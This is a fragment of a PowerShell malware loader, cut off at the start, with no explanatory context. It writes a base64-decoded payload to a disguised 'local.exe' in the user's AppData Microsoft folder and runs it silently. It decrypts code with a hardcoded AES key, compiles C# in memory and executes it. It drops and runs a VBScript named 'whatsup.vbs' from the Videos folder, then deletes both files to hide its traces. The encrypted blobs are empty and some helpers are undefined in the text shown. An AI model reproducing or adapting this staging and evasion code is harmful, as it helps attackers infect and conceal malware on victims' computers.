"
$pathEngine = "$env:LOCALAPPDATA\Microsoft\local.exe"

$binaryDATAengine = [Convert]::FromBase64String($engineBase64)
[IO.File]::WriteAllBytes($pathEngine, $binaryDATAengine) 

$maxWaitTime = 30
$waitInterval = 1
$elapsedTime = 0

while ((Test-Path $pathEngine) -eq $false -or ((Get-Item $pathEngine).Length -lt $expectedSize)) {
    if ($elapsedTime -ge $maxWaitTime) {
        break
    }
    Start-Sleep -Seconds $waitInterval
    $elapsedTime += $waitInterval
}

function Compile-AndExecute {
    param (
        [string]$csharpCode,
        [string]$methodName,
        [string[]]$parameters
    )

    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider

    $parametersCompile = New-Object System.CodeDom.Compiler.CompilerParameters
    $parametersCompile.GenerateInMemory = $true
    $parametersCompile.GenerateExecutable = $false
    $parametersCompile.ReferencedAssemblies.Add("System.dll")
    $parametersCompile.ReferencedAssemblies.Add("System.Windows.Forms.dll")

    $compileResults = $provider.CompileAssemblyFromSource($parametersCompile, $csharpCode)

    if ($compileResults.Errors.HasErrors) {
        throw "Compilation failed: $($compileResults.Errors)"
    }

    $assembly = $compileResults.CompiledAssembly

    $type = $assembly.GetType("DynamicNamespace.DynamicClass")
    $method = $type.GetMethod($methodName)

    return $method.Invoke($null, $parameters)
}

Start-Sleep -Seconds 10

$methodName = "ExecuteCommand"
$parameters = @("& `"$($env:LOCALAPPDATA)\Microsoft\local.exe`" `/silent `/hide_progress `/hide_splash")

Start-Sleep -Seconds 5

$key = "olulsfbxnczpriex"
$csharpCodeEncrypted = ""
$csharpCodeDecrypted = DecryptAES -encryptedHexString $csharpCodeEncrypted -key $key

Start-Sleep -Seconds 5

Compile-AndExecute -csharpCode $csharpCodeDecrypted -methodName $methodName -parameters $parameters

Start-Sleep -Seconds 5

$vbScriptEncrypted = ""
$vbScriptDecrypted = DecryptAES -encryptedHexString $vbScriptEncrypted -key $key

Start-Sleep -Seconds 5

$musicFolderPath = [System.Environment]::GetFolderPath('MyVideos')
$vbScriptFilePath = Join-Path -Path $musicFolderPath -ChildPath "whatsup.vbs"
$vbScriptDecrypted | Set-Content -Path $vbScriptFilePath -Encoding ASCII

Start-Sleep -Seconds 5

$parameters = @("Start-Process -FilePath ""wscript.exe"" -ArgumentList $vbScriptFilePath -NoNewWindow -Wait")
Compile-AndExecute -csharpCode $csharpCodeDecrypted -methodName $methodName -parameters $parameters
Start-Sleep -Seconds 5
Remove-Item -Path $vbScriptFilePath -Force
Remove-Item $pathEngine -Force